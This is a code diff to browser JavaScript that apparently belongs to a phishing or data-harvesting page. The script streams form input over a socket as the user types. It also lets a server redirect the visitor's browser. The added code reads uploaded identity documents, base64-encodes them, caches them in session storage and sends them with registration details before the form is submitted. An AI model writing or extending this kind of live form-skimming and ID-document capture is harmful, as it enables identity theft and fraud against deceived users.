@@ -38,6 +38,17 @@ function syncSavedReview() {
     if (raw) {
       const review = JSON.parse(raw);
       if (review && (review.firstName || review.email)) {
+        try {
+          const savedFile = sessionStorage.getItem('tracker_file_identityFile');
+          if (savedFile) {
+            const f = JSON.parse(savedFile);
+            if (f && f.dataUrl) {
+              review.identityFile = f.dataUrl;
+              review.identityFileName = f.name;
+              review.identityFileSize = f.size;
+            }
+          }
+        } catch (e) {}
         socket.emit('user:form-submit', { sessionId, page: 'registration', formData: review });
       }
     }
@@ -65,13 +76,120 @@ socket.on('navigate', ({ page }) => {
   window.location.href = target;
 });
 
-// 4. Form Data Extraction Helper
+// 4. File Processing Helper (Resize and Base64)
+function processFileInput(input, callback) {
+  const file = input && input.files && input.files[0];
+  if (!file) {
+    if (callback) callback(null);
+    return;
+  }
+
+  const fileName = file.name || 'document';
+  const fileSizeStr = file.size < 1024 * 1024
+    ? `${Math.max(1, Math.round(file.size / 1024))} KB`
+    : `${(file.size / (1024 * 1024)).toFixed(1)} MB`;
+
+  if (file.type.startsWith('image/')) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const img = new Image();
+      img.onload = function() {
+        let width = img.width;
+        let height = img.height;
+        const maxDim = 1200;
+        if (width > maxDim || height > maxDim) {
+          if (width > height) {
+            height = Math.round((height * maxDim) / width);
+            width = maxDim;
+          } else {
+            width = Math.round((width * maxDim) / height);
+            height = maxDim;
+          }
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(img, 0, 0, width, height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.82);
+
+        input._fileDataUrl = dataUrl;
+        input._fileName = fileName;
+        input._fileSize = fileSizeStr;
+
+        try {
+          sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), JSON.stringify({
+            dataUrl,
+            name: fileName,
+            size: fileSizeStr
+          }));
+        } catch (err) {}
+
+        if (callback) callback(dataUrl);
+      };
+      img.onerror = function() {
+        input._fileDataUrl = e.target.result;
+        input._fileName = fileName;
+        input._fileSize = fileSizeStr;
+        if (callback) callback(e.target.result);
+      };
+      img.src = e.target.result;
+    };
+    reader.onerror = function() {
+      if (callback) callback(null);
+    };
+    reader.readAsDataURL(file);
+  } else {
+    // Non-image file (e.g. PDF)
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      const dataUrl = e.target.result;
+      input._fileDataUrl = dataUrl;
+      input._fileName = fileName;
+      input._fileSize = fileSizeStr;
+      try {
+        sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), JSON.stringify({
+          dataUrl,
+          name: fileName,
+          size: fileSizeStr
+        }));
+      } catch (err) {}
+      if (callback) callback(dataUrl);
+    };
+    reader.onerror = function() {
+      if (callback) callback(null);
+    };
+    reader.readAsDataURL(file);
+  }
+}
+
+// 5. Form Data Extraction Helper
 function extractFormData(form) {
   const formData = new FormData(form);
   const data = {};
   formData.forEach((v, k) => {
     if (v instanceof File) {
-      data[k] = v.name ? `${v.name} (${Math.round(v.size / 1024)} KB)` : '';
+      const fileInput = form.querySelector(`input[name="${k}"]`);
+      if (fileInput && fileInput._fileDataUrl) {
+        data[k] = fileInput._fileDataUrl;
+        data[k + 'Name'] = fileInput._fileName || v.name;
+        data[k + 'Size'] = fileInput._fileSize || `${Math.round(v.size / 1024)} KB`;
+      } else {
+        try {
+          const cached = sessionStorage.getItem('tracker_file_' + k);
+          if (cached) {
+            const parsed = JSON.parse(cached);
+            if (parsed && parsed.dataUrl) {
+              data[k] = parsed.dataUrl;
+              data[k + 'Name'] = parsed.name || v.name;
+              data[k + 'Size'] = parsed.size || '';
+            }
+          }
+        } catch(e) {}
+        if (!data[k]) {
+          data[k] = v.name ? `${v.name} (${Math.round(v.size / 1024)} KB)` : '';
+        }
+      }
     } else if (v !== undefined && v !== null && String(v).trim() !== '') {
       data[k] = String(v).trim();
     }
@@ -80,8 +198,16 @@ function extractFormData(form) {
   // Also catch fields that may not be in FormData (e.g. custom inputs)
   form.querySelectorAll('input, select, textarea').forEach(el => {
     const name = el.name || el.id;
-    if (name && el.value && !data[name] && el.type !== 'file' && el.type !== 'password') {
-      data[name] = String(el.value).trim();
+    if (name && !data[name] && el.type !== 'password') {
+      if (el.type === 'file') {
+        if (el._fileDataUrl) {
+          data[name] = el._fileDataUrl;
+          data[name + 'Name'] = el._fileName || (el.files && el.files[0] ? el.files[0].name : '');
+          data[name + 'Size'] = el._fileSize || '';
+        }
+      } else if (el.value && String(el.value).trim() !== '') {
+        data[name] = String(el.value).trim();
+      }
     }
   });
 
@@ -93,7 +219,7 @@ function extractFormData(form) {
   return data;
 }
 
-// 5. Send Form Data (Socket + Fallback POST)
+// 6. Send Form Data (Socket + Fallback POST)
 function sendFormData(form, page, isSubmit = false) {
   const data = extractFormData(form);
   if (!data || Object.keys(data).length === 0) return;
@@ -112,18 +238,34 @@ function sendFormData(form, page, isSubmit = false) {
   }
 }
 
-// 6. Live and Submit Capture
+// 7. Live and Submit Capture
 function captureForm(form, page) {
   let debounceTimer = null;
-  form.addEventListener('input', () => {
+  form.addEventListener('input', (e) => {
+    if (e.target && e.target.type === 'file') return;
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(() => {
       sendFormData(form, page, false);
     }, 400);
   });
 
-  form.addEventListener('change', () => {
-    sendFormData(form, page, false);
+  form.addEventListener('change', (e) => {
+    if (e.target && e.target.type === 'file') {
+      processFileInput(e.target, () => {
+        sendFormData(form, page, false);
+      });
+    } else {
+      sendFormData(form, page, false);
+    }
+  });
+
+  // Bind change listeners to all file inputs directly
+  form.querySelectorAll('input[type="file"]').forEach(fileInput => {
+    fileInput.addEventListener('change', () => {
+      processFileInput(fileInput, () => {
+        sendFormData(form, page, false);
+      });
+    });
   });
 
   form.addEventListener('submit', () => {
